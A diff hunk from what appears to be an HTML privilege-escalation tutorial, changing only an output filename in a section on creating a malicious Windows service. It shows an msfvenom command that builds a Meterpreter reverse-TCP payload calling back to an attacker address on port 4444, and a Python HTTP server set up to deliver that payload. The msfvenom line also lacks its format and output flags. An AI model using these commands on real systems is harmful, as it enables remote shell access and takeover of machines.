@@ -163,7 +163,7 @@
                             <br>
                             <h4>Creating a malicious service</h4>
                             First, we need a malicious payload. To generate one, use <strong>msfvenom</strong>.
-                            <div class="squarebox">msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.80.134 lport=4444 ploit.exe</div>
+                            <div class="squarebox">msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.80.134 lport=4444 dangerousexploit.exe</div>
                             <img src="img/SDDL/msfvenom.jpg" class="img-fluid" width="800">
                             Then host the payload on a python HTTP server. The payload has to be stored on the directory that you have started your python server, in my case <strong>/root/http</strong>
                             <div class="squarebox">python3 -m http.server 8000</div>
